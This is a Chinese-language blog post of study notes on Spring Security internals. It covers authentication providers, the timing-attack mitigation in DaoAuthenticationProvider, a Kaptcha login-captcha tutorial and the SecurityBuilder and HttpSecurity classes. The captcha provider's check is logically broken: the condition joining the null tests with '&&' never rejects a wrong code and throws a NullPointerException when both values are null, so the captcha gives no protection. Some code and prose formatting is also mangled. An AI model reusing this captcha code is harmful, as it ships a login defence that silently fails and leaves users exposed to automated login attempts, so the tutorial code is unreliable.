class="hljs-comment">//认证的加密方式等</span><br><span class="hljs-keyword">private</span> PasswordEncoder passwordEncoder;<br><span class="hljs-comment">//保存认证失败后USER_NOT_FOUND_PASSWORD的加密字符串</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> String userNotFoundEncodedPassword;<br><span class="hljs-comment">//用于查询用户的类</span><br><span class="hljs-keyword">private</span> UserDetailsService userDetailsService;<br><span class="hljs-comment">//进行密码认证的类</span><br><span class="hljs-keyword">private</span> UserDetailsPasswordService userDetailsPasswordService;<br></code></pre></td></tr></table></figure><ul><li><p>DaoAuthenticationProvider的构造方法中，默认就会指定PasswordEncoder，当然开发者也可以通过set方法自定义PasswordEncoder。</p></li><li><p>additionalAuthenticationChecks方法主要进行密码校验，该方法第一个参数userDetails是从数据库中查询出来的用户对象，第二个参数authentication则是登录用户输入的参数。从这两个参数中分别提取出来用户密码，然后调用passwordEncoder.matches方法进行密码比对。</p></li><li><p>retrieveUser方法则是获取用户对象的方法，具体做法就是调用UserDetailsService#loadUserByUsername方法去数据库中查询。</p><ul><li><blockquote><p>）在retrieveUser方法中，有一个值得关注的地方。在该方法一开始，首先会调用prepareTimingAttackProtection方法，该方法的作用是使用PasswordEncoder对常量USER_NOT_FOUND_PASSWORD进行加密，将加密结果保存在userNotFoundEncoded Password变量中。当根据用户名查找用户时，如果抛出了UsernameNotFoundException异常，则调用mitigateAgainstTimingAttack方法进行密码比对。有读者会说，用户都没查找到，怎么比对密码？需要注意，在调用mitigateAgainstTimingAttack方法进行密码比对时，使用了userNotFoundEncodedPassword变量作为默认密码和登录请求传来的用户密码进行比对。这是一个一开始就注定要失败的密码比对，那么为什么还要进行比对呢？这主要是为了避免旁道攻击（Side-channel attack）。如果根据用户名查找用户失败，就直接抛出异常而不进行密码比对，那么黑客经过大量的测试，就会发现有的请求耗费时间明显小于其他请求，那么进而可以得出该请求的用户名是一个不存在的用户名（因为用户名不存在，所以不需要密码比对，进而节省时间），这样就可以获取到系统信息。为了避免这一问题，所以当用户查找失败时，也会调用mitigateAgainstTimingAttack方法进行密码比对，这样就可以迷惑黑客。</p></blockquote></li></ul></li><li><p>createSuccessAuthentication方法则是在登录成功后，创建一个全新的UsernamePasswordAuthenticationToken对象，同时会判断是否需要进行密码升级，如果需要进行密码升级，就会在该方法中进行加密方案升级。</p></li></ul><h5 id="ProviderManager和AuthenticationProvider的关系"><a href="#ProviderManager和AuthenticationProvider的关系" class="headerlink" title="ProviderManager和AuthenticationProvider的关系"></a>ProviderManager和AuthenticationProvider的关系</h5><p>在Spring Security中，由于系统可能同时支持多种不同的认证方式，例如同时支持用户名／密码认证、RememberMe认证、手机号码动态认证等，而不同的认证方式对应了不同的AuthenticationProvider，所以一个完整的认证流程可能由多个AuthenticationProvider来提供。<br>多个AuthenticationProvider将组成一个列表，这个列表将由ProviderManager代理。换句话说，在ProviderManager中存在一个AuthenticationProvider列表，在ProviderManager中遍历列表中的每一个AuthenticationProvider去执行身份认证，最终得到认证结果。</p><h5 id="AbstractAuthenticationProcessingFilter"><a href="#AbstractAuthenticationProcessingFilter" class="headerlink" title="AbstractAuthenticationProcessingFilter"></a>AbstractAuthenticationProcessingFilter</h5><p>任何登录请求都会经过该过滤链器的实现类为UsernamePasswordAuthenticationFilter</p><h3 id="过滤器分析"><a href="#过滤器分析" class="headerlink" title="过滤器分析"></a>过滤器分析</h3><h3 id="配置多数据源"><a href="#配置多数据源" class="headerlink" title="配置多数据源"></a>配置多数据源</h3><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211009150724088.png" alt="image-20211009150724088"></p><h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><h5 id="通过自定义过滤器"><a href="#通过自定义过滤器" class="headerlink" title="通过自定义过滤器"></a>通过自定义过滤器</h5><p>emmmm…..等着!!!</p><h5 id="通过自定义认证逻辑"><a href="#通过自定义认证逻辑" class="headerlink" title="通过自定义认证逻辑"></a>通过自定义认证逻辑</h5><blockquote><p>如果通过重写DaoAuthenticationProvider类的additionalAuthenticationChecks方法来完成验证码的校验，这个从技术上来说是没有问题的，但是这会让验证码失去存在的意义，因为当additionalAuthenticationChecks方法被调用时，数据库查询已经做了，仅仅剩下密码没有校验，此时，通过验证码来拦截恶意登录的功能就已经失效了。</p></blockquote><p>首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.github.penggle<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>kaptcha<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>创建配置文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KaptchaConfig</span> &#123;<br>    <span class="hljs-meta">@Bean</span><br>    Producer <span class="hljs-title function_">kaptcha</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        properties.setProperty(<span class="hljs-string">&quot;kaptcha.image.width&quot;</span>, <span class="hljs-string">&quot;150&quot;</span>);<br>        properties.setProperty(<span class="hljs-string">&quot;kaptcha.image.height&quot;</span>, <span class="hljs-string">&quot;50&quot;</span>);<br>        properties.setProperty(<span class="hljs-string">&quot;kaptcha.textproducer.char.string&quot;</span>,<br>                <span class="hljs-string">&quot;0123456789&quot;</span>);<br><br>        properties.setProperty(<span class="hljs-string">&quot;kaptcha.textproducer.char.length&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>);<br>        <span class="hljs-type">Config</span> <span class="hljs-variable">config</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Config</span>(properties);<br>        <span class="hljs-type">DefaultKaptcha</span> <span class="hljs-variable">defaultKaptcha</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultKaptcha</span>();<br>        defaultKaptcha.setConfig(config);<br>        <span class="hljs-keyword">return</span> defaultKaptcha;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建一个类继承DaoAuthenticationProvider</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">KaptchaAuthenticationProvider</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">DaoAuthenticationProvider</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Authentication <span class="hljs-title function_">authenticate</span><span class="hljs-params">(Authentication authentication)</span> <span class="hljs-keyword">throws</span> AuthenticationException &#123;<br><br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">req</span> <span class="hljs-operator">=</span> ((ServletRequestAttributes) RequestContextHolder<br>                .getRequestAttributes()).getRequest();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> req.getParameter(<span class="hljs-string">&quot;image&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">kaptcha</span> <span class="hljs-operator">=</span> (String) req.getSession().getAttribute(<span class="hljs-string">&quot;kaptcha&quot;</span>);<br><br>        <span class="hljs-keyword">if</span>(kaptcha==<span class="hljs-literal">null</span> &amp;&amp; image==<span class="hljs-literal">null</span> &amp;&amp; kaptcha.equals(image))&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthenticationServiceException</span>(<span class="hljs-string">&quot;验证码输入错误&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">super</span>.authenticate(authentication);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在SecurityConfig中注册添加到Bean中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-keyword">public</span> AuthenticationManager <span class="hljs-title function_">authenticationManagerBean</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">KaptchaAuthenticationProvider</span> <span class="hljs-variable">provider</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">KaptchaAuthenticationProvider</span>();<br>    provider.setUserDetailsService(service);<br>    <span class="hljs-type">ProviderManager</span> <span class="hljs-variable">providerManager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProviderManager</span>(provider);<br>    <span class="hljs-keyword">return</span> providerManager;<br>&#125;<br></code></pre></td></tr></table></figure><p>创建Controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br>Producer producer;<br><br><span class="hljs-meta">@RequestMapping(&quot;/cv.jpg&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">pTest</span><span class="hljs-params">(HttpServletResponse resp, HttpSession session)</span>&#123;<br><br>    resp.setContentType(<span class="hljs-string">&quot;image/jpeg&quot;</span>);<br>    <span class="hljs-type">String</span> <span class="hljs-variable">text</span> <span class="hljs-operator">=</span> producer.createText();<br>    session.setAttribute(<span class="hljs-string">&quot;kaptcha&quot;</span>,text);<br>    <span class="hljs-type">BufferedImage</span> <span class="hljs-variable">image</span> <span class="hljs-operator">=</span> producer.createImage(text);<br>    <span class="hljs-keyword">try</span> (<span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> resp.getOutputStream()) &#123;<br><br>        ImageIO.write(image,<span class="hljs-string">&quot;jpg&quot;</span>,outputStream);<br><br>    &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>在SecurityConfig中不对该请求过滤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(HttpSecurity http)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//.anyRequest().authenticated()代表所有请求认证后才能访问</span><br>    http.authorizeRequests()<br>            .antMatchers(<span class="hljs-string">&quot;/cv.jpg&quot;</span>)<br>            .permitAll()<br>            .anyRequest()<br>            .authenticated()<br>            <span class="hljs-comment">//and代表将将原来的http返回</span><br>            .and()<br>        <span class="hljs-comment">//......等等</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="基础组件"><a href="#基础组件" class="headerlink" title="基础组件"></a>基础组件</h3><p>由于Spring Security中大量采用了Java配置，许多过滤器都是直接new出来的，这些直接new出来的对象并不会自动注入到Spring容器中。所以第一个组件是用来注册到容器中</p><h4 id="ObjectPostProcessor-对一个成功创建的实例使用这个类进行补充"><a href="#ObjectPostProcessor-对一个成功创建的实例使用这个类进行补充" class="headerlink" title="ObjectPostProcessor:对一个成功创建的实例使用这个类进行补充"></a>ObjectPostProcessor:对一个成功创建的实例使用这个类进行补充</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ObjectPostProcessor</span>&lt;T&gt; &#123;<br>&lt;O <span class="hljs-keyword">extends</span> <span class="hljs-title class_">T</span>&gt; O <span class="hljs-title function_">postProcess</span><span class="hljs-params">(O object)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>该接口有两个实现类:</p><ul><li>AutowireBeanFactoryObjectPostProcessor:使用该类的postProcess方法将类加载进去</li><li>CompositeObjectPostProcessor:是ObjectPostProcessor的集合,里面有一个关于该接口的List对象调用实现方法实际就是遍历List并使用postProcess方法进行处理,Security使用的后置对象就是这个方法,但默认只有一个AutowireBeanFactoryObjectPostProcessor</li></ul><p>每个过滤器都有一个configurer的配置器,这些过滤器就是在配置器中new出来并使用postProcess进行处理</p><h4 id="SecurityFilterChain-过滤器链对象"><a href="#SecurityFilterChain-过滤器链对象" class="headerlink" title="SecurityFilterChain:过滤器链对象"></a>SecurityFilterChain:过滤器链对象</h4><p>该接口的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">SecurityFilterChain</span> &#123;<br>    <span class="hljs-type">boolean</span> <span class="hljs-title function_">matches</span><span class="hljs-params">(HttpServletRequest var1)</span>;<br><br>    List&lt;Filter&gt; <span class="hljs-title function_">getFilters</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>matches:用来处理是否能够被该过滤器链处理</li><li>getFilters:返回所有的过滤器</li></ul><p>该接口只有一个实现类DefaultSecurityFilterChain</p><p>该过滤器链可能会有多个</p><h4 id="SecurityBuilder-构建所有需要的对象"><a href="#SecurityBuilder-构建所有需要的对象" class="headerlink" title="SecurityBuilder:构建所有需要的对象"></a>SecurityBuilder:构建所有需要的对象</h4><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211011093037215.png" alt="image-20211011093037215"></p><h5 id="HttpSecurityBuilder："><a href="#HttpSecurityBuilder：" class="headerlink" title="HttpSecurityBuilder："></a>HttpSecurityBuilder：</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">HttpSecurityBuilder</span>&lt;H <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpSecurityBuilder</span>&lt;H&gt;&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityBuilder</span>&lt;DefaultSecurityFilterChain&gt; &#123;<br>    <span class="hljs-comment">//获取配置器</span><br>    &lt;C <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityConfigurer</span>&lt;DefaultSecurityFilterChain, H&gt;&gt; C <span class="hljs-title function_">getConfigurer</span><span class="hljs-params">(Class&lt;C&gt; var1)</span>;<br><span class="hljs-comment">//移除配置器</span><br>    &lt;C <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityConfigurer</span>&lt;DefaultSecurityFilterChain, H&gt;&gt; C <span class="hljs-title function_">removeConfigurer</span><span class="hljs-params">(Class&lt;C&gt; var1)</span>;<br><span class="hljs-comment">//设置一个可以在各个配置器间共享的对象</span><br>    &lt;C&gt; <span class="hljs-keyword">void</span> <span class="hljs-title function_">setSharedObject</span><span class="hljs-params">(Class&lt;C&gt; var1, C var2)</span>;<br><span class="hljs-comment">//获取一个可以在各个配置器间共享的对象</span><br>    &lt;C&gt; C <span class="hljs-title function_">getSharedObject</span><span class="hljs-params">(Class&lt;C&gt; var1)</span>;<br><span class="hljs-comment">//配置认证器</span><br>    H <span class="hljs-title function_">authenticationProvider</span><span class="hljs-params">(AuthenticationProvider var1)</span>;<br><span class="hljs-comment">//配置数据源</span><br>    H <span class="hljs-title function_">userDetailsService</span><span class="hljs-params">(UserDetailsService var1)</span> <span class="hljs-keyword">throws</span> Exception;<br><span class="hljs-comment">//之后添加一个过滤器</span><br>    H <span class="hljs-title function_">addFilterAfter</span><span class="hljs-params">(Filter var1, Class&lt;? extends Filter&gt; var2)</span>;<br><span class="hljs-comment">//之前添加一个过滤器</span><br>    H <span class="hljs-title function_">addFilterBefore</span><span class="hljs-params">(Filter var1, Class&lt;? extends Filter&gt; var2)</span>;<br><span class="hljs-comment">//添加一个过滤器</span><br>    H <span class="hljs-title function_">addFilter</span><span class="hljs-params">(Filter var1)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="AbstractSecurityBuilder"><a href="#AbstractSecurityBuilder" class="headerlink" title="AbstractSecurityBuilder:"></a>AbstractSecurityBuilder:</h5><p>该确保Build方法只Build一次</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> O <span class="hljs-title function_">build</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.building.compareAndSet(<span class="hljs-literal">false</span>, <span class="hljs-literal">true</span>)) &#123;<br>        <span class="hljs-built_in">this</span>.object = <span class="hljs-built_in">this</span>.doBuild();<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.object;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AlreadyBuiltException</span>(<span class="hljs-string">&quot;This object has already been built&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>关于方法被设为final<a href="https://www.cnblogs.com/frankyou/p/6022959.html">https://www.cnblogs.com/frankyou/p/6022959.html</a></p><ul><li>第一,防止后续的继承修改该方法</li><li>第二,对应程序较少的方法提升效率</li></ul><p>该类虽然实现了只build一次但是没有实现具体的build而是交给他的doBuild抽象方法</p><h5 id="AbstractConfiguredSecurityBuilder"><a href="#AbstractConfiguredSecurityBuilder" class="headerlink" title="AbstractConfiguredSecurityBuilder:"></a>AbstractConfiguredSecurityBuilder:</h5><p>首先该类定义了一个枚举类:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">BuildState</span> &#123;<br>    UNBUILT(<span class="hljs-number">0</span>),<span class="hljs-comment">//配置前</span><br>    INITIALIZING(<span class="hljs-number">1</span>),<span class="hljs-comment">//初始化中</span><br>    CONFIGURING(<span class="hljs-number">2</span>),<span class="hljs-comment">//配置中</span><br>    BUILDING(<span class="hljs-number">3</span>),<span class="hljs-comment">//构件中</span><br>    BUILT(<span class="hljs-number">4</span>);<span class="hljs-comment">//构建完成</span><br>    <span class="hljs-comment">//....省略</span><br>&#125;<br></code></pre></td></tr></table></figure><p>首先声明了一个configurers变量用来保存所有的配置类,关于该类的方法:</p><ul><li>apply:添加配置类(调用add方法实现)</li><li>add:方法用来将所有的配置类保存到configurers中，在添加的过程中，如果&#x3D;&#x3D;allowConfigurersOfSameType变量为true，则表示允许相同类型的配置类存在&#x3D;&#x3D;，也就是List集合中可以存在多个相同类型的配置类。默认情况下，如果是普通配置类，allowConfigurersOfSameType是false，所以List集合中的配置类始终只有一个配置类；如果在AuthenticationManagerBuilder中设置allowConfigurersOfSameType为true，此时相同类型的配置类可以有多个</li><li>getConfigurers:方法可以从configurers中返回某一个配置类对应的所有实例</li><li>removeConfigurers:可以移除某一个配置类的所有实例</li><li>getConfigurer方法也是获取配置类实例，但是只获取集合中第一项。</li><li>removeConfigurer方法可以从configurers中移除某一个配置类对应的所有配置类实例，并返回被移除掉的配置类实例中的第一项。</li></ul><p>由于该类继承了AbstractSecurityBuilder所有需要实现onBuild</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> O <span class="hljs-title function_">doBuild</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>.configurers) &#123;<br>        <span class="hljs-built_in">this</span>.buildState = AbstractConfiguredSecurityBuilder.BuildState.INITIALIZING;<br>        <span class="hljs-built_in">this</span>.beforeInit();<br>        <span class="hljs-built_in">this</span>.init();<br>        <span class="hljs-built_in">this</span>.buildState = AbstractConfiguredSecurityBuilder.BuildState.CONFIGURING;<br>        <span class="hljs-built_in">this</span>.beforeConfigure();<br>        <span class="hljs-built_in">this</span>.configure();<br>        <span class="hljs-built_in">this</span>.buildState = AbstractConfiguredSecurityBuilder.BuildState.BUILDING;<br>        <span class="hljs-type">O</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.performBuild();<br>        <span class="hljs-built_in">this</span>.buildState = AbstractConfiguredSecurityBuilder.BuildState.BUILT;<br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出这个方法是synchronized并且还是final的</p><p>首先init();是遍历所有配置类,并完成初始化</p><p>configure();完成所有配置类的配置</p><p>performBuild();最终完成构建操作</p><h5 id="ProviderManagerBuilder"><a href="#ProviderManagerBuilder" class="headerlink" title="ProviderManagerBuilder"></a>ProviderManagerBuilder</h5><p>该接口是继承SecurityBuilder类并新增了一个Authentication authenticate(Authentication authentication)方法</p><h5 id="AuthenticationManagerBuilder"><a href="#AuthenticationManagerBuilder" class="headerlink" title="AuthenticationManagerBuilder"></a>AuthenticationManagerBuilder</h5><p>继承自<a href="#AbstractConfiguredSecurityBuilder">AbstractConfiguredSecurityBuilder</a>并实现了ProviderManagerBuilder接口</p><ul><li><p>构造方法</p><ul><li>&#96;&#96;&#96;java<br>public AuthenticationManagerBuilder(ObjectPostProcessor<Object> objectPostProcessor) {<br>    super(objectPostProcessor, true);<br>}<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><br>    可以看出调用了父类的构造方法也就是AbstractConfiguredSecurityBuilder的构造并且传递了<span class="hljs-literal">true</span>(允许相同类型的配置类同时存在)<br><br>- parentAuthenticationManager:给一个AuthenticationManager设置parent在[ProviderManager](<span class="hljs-meta">#ProviderManager)中提到如果认证失败就去父类再次认证</span><br><br>- inMemoryAuthentication、jdbcAuthentication以及userDetailsService:配置数据源<br><br>- authenticationProvider:该方法用来向authenticationProviders集合中添加AuthenticationProvider对象<br><br>- performBuild:执行具体的构建工作<br><br><br><br><span class="hljs-meta">#### HttpSecurity</span><br><br>构建一条过滤器链并反应到代码上,用于构建DefaultSecurityFilterChain<br><br>DefaultSecurityFilterChain包含一个路径匹配器和多个SpringSecurity过滤器,HttpSecurity会收集各种xxxconfigurers并将其放入父类的configurers中,要构建的时候再用这些configurer进行构建同时添加到HttpSecurity的filters<br><br>由于很多重复的源码所以这里以form表单登录配置为例<br><br>```<span class="hljs-function">java</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> FormLoginConfigurer&lt;HttpSecurity&gt; <span class="hljs-title">formLogin</span>() throws Exception</span> &#123;<br>    <span class="hljs-keyword">return</span> (FormLoginConfigurer)<span class="hljs-keyword">this</span>.getOrApply(<span class="hljs-keyword">new</span> FormLoginConfigurer());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> HttpSecurity <span class="hljs-title">formLogin</span>(<span class="hljs-params">Customizer&lt;FormLoginConfigurer&lt;HttpSecurity&gt;&gt; formLoginCustomizer</span>) throws Exception</span> &#123;<br>    formLoginCustomizer.customize((FormLoginConfigurer)<span class="hljs-keyword">this</span>.getOrApply(<span class="hljs-keyword">new</span> FormLoginConfigurer()));<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>;<br>&#125;<br></code></pre></td></tr></table></figure></Object></li></ul></li></ul><p>可以看出一个有参一个无参,无参的返回FormLoginConfigurer对象然后可以继续配置,对于有参来说直接传递一个配置类即可完成配置然后返回HttpSecurity来继续进行其他配置,还记得SecurityConfig这个自己的配置文件吗</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211011165450240.png" alt="image-20211011165450240"></p><p>可以看出and后返回的就是HttpSecurity</p><p>并且有参和无参方法都调用了:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> &lt;C <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SecurityConfigurerAdapter</span>&lt;DefaultSecurityFilterChain, HttpSecurity&gt;&gt; C <span class="hljs-title function_">getOrApply</span><span class="hljs-params">(C configurer)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">C</span> <span class="hljs-variable">existingConfig</span> <span class="hljs-operator">=</span> (SecurityConfigurerAdapter)<span class="hljs-built_in">this</span>.getConfigurer(configurer.getClass());<br>    <span class="hljs-keyword">return</span> existingConfig != <span class="hljs-literal">null</span> ? existingConfig : <span class="hljs-built_in">this</span>.apply(configurer);<br>&#125;<br></code></pre></td></tr></table></figure><p>该方法就是调用父类的getConfigurer方法查看是否存在配置类有的话直接返回没有则使用父类的apply调用添加</p><p>其他的配置都和这个类似</p><ul><li><p>每一套过滤器链都会有一个AuthenticationManager对象来进行认证操作（如果认证失败，则会调用AuthenticationManager的parent再次进行认证），主要是通过authentication 